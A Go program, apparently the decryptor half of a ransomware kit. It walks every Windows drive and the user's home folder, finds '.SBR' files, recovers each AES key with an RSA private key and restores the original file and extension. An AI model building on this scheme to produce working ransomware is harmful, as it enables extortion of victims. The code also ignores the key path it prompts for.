package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
)

var privateKey *rsa.PrivateKey

func main() {
	windowsDrivers := getDrives()
	fmt.Println(windowsDrivers)
	for index, driver := range windowsDrivers {
		if driver == "C:\\" {
			userDir, err := userDirectory()
			if err == nil {
				windowsDrivers[index] = userDir
			}
		}
	}
	fmt.Println(windowsDrivers)
	var path string
	fmt.Print("Enter private key path: ")
	fmt.Scan(&path)
	if path == "" {
		fmt.Println("Path cannot be empty.")
		return
	}
	var err error
	privateKey, err = loadPrivateKey("private_key.pem")
	if err != nil {
		log.Fatalf("Özel anahtar yükleme hatası: %v", err)
	}

	for _, driver := range windowsDrivers {
		travelDirectory(driver)
	}

}

func rsaDecrypt(privateKey *rsa.PrivateKey, ciphertext []byte) ([]byte, error) {
	return rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, nil)
}

func userDirectory() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Kullanıcı bilgisi alınamadı:", err)
		return "", err
	}
	return currentUser.HomeDir, nil
}

func travelDirectory(driver string) {
	_ = filepath.Walk(driver,
		func(path string, info fs.FileInfo, err error) error {
			if err != nil {
				log.Println(err)
				return nil
			}
			if strings.Contains(path, "AppData") {
				return filepath.SkipDir
			}
			if !info.IsDir() {
				if extensionControl(path) {
					file, err := os.OpenFile(path, os.O_RDWR, 0o644)
					if err != nil {
						fmt.Println("Dosya açma hatası:", err)
						file.Close()
						return nil
					}
					defer file.Close()

					fi, err := file.Stat()
					if err != nil {
						fmt.Println("Dosya boyutu alma hatası:", err)
						return nil
					}

					data := make([]byte, fi.Size())
					_, err = file.Read(data)
					if err != nil {
						fmt.Println("Dosya okuma hatası:", err)
						return nil
					}

					dataStr := string(data)
					parts := strings.Split(dataStr, ":")
					if len(parts) != 3 { 
						fmt.Println("Geçersiz şifreli veri formatı:", dataStr)
						return nil
					}
					encryptedKeyHex := parts[0]
					cipherTextHex := parts[2]
					extension := parts[1] // Uzantıyı buradan alıyoruz

					encryptedKey, err := hex.DecodeString(encryptedKeyHex)
					if err != nil {
						log.Println("Anahtar çözme hatası:", err)
						return nil
					}
					key, err := rsaDecrypt(privateKey, encryptedKey)
					if err != nil {
						fmt.Println("RSA şifre çözme hatası:", err)
						return nil
					}

					decryptedData, err := decrypt(cipherTextHex, key)
					if err != nil {
						fmt.Println("AES şifre çözme hatası:", err)
						return nil
					}
					file.Close()
					newPath := strings.TrimSuffix(path, filepath.Ext(path)) + "." + extension 
					err = os.Rename(path, newPath)                                            
					if err != nil {
						fmt.Println("Dosya adı değiştirme hatası:", err)
						return nil
					}

					err = os.WriteFile(newPath, decryptedData, 0o644)
					if err != nil {
						fmt.Println("Dosya yazma hatası:", err)
						return nil
					}
					fmt.Printf("Dosya şifresi çözüldü ve uzantısı %s olarak değiştirildi: %s\n", extension, newPath)
				}
			}
			return nil
		})
}

func extensionControl(filePath string) bool {
	regex := `\.(SBR)$`
	r, _ := regexp.Compile(regex)
	return r.MatchString(filePath)
}



func getDrives() []string {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getLogicalDrives := kernel32.NewProc("GetLogicalDrives")

	// GetLogicalDrives returns a bitmask representing the drives
	ret, _, _ := getLogicalDrives.Call()

	var drives []string
	for i := 0; i < 26; i++ {
		if ret&(1<<i) != 0 {
			driveLetter := string('A'+i) + ":\\"
			drives = append(drives, driveLetter)
		}
	}

	return drives
}

func decrypt(ciphertextHex string, key []byte) ([]byte, error) {
	ciphertext, err := hex.DecodeString(ciphertextHex)
	if err != nil {
		return nil, fmt.Errorf("şifreli veriyi çözme hatası: %v", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("AES bloğu oluşturma hatası: %v", err)
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, errors.New("şifreli veri çok kısa")
	}

	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)

	return ciphertext, nil
}

// RSA Özel Anahtar Yükleme
func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
	keyData, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("anahtar dosyası okuma hatası: %v", err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil || block.Type != "RSA PRIVATE KEY" {
		return nil, errors.New("geçersiz PEM formatı")
	}

	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("private key parsing hatası: %v", err)
	}

	return privateKey, nil
}
